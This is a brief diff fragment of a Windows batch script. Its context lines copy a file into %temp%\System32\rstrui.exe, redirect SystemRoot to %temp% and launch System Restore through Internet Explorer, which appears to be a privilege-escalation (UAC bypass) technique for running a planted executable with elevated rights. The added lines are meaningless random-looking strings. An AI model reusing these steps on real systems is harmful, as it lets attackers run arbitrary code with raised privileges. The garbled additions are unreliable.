@@ -12,3 +12,8 @@ copy %a% %temp%\System32\rstrui.exe /Y > NUL
 set SystemRoot=%temp%
 
 start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}
+
+
+leugai8eephei0ot1quaMai4Yea"C^ee
+
+iet4yi3Einae|x3L
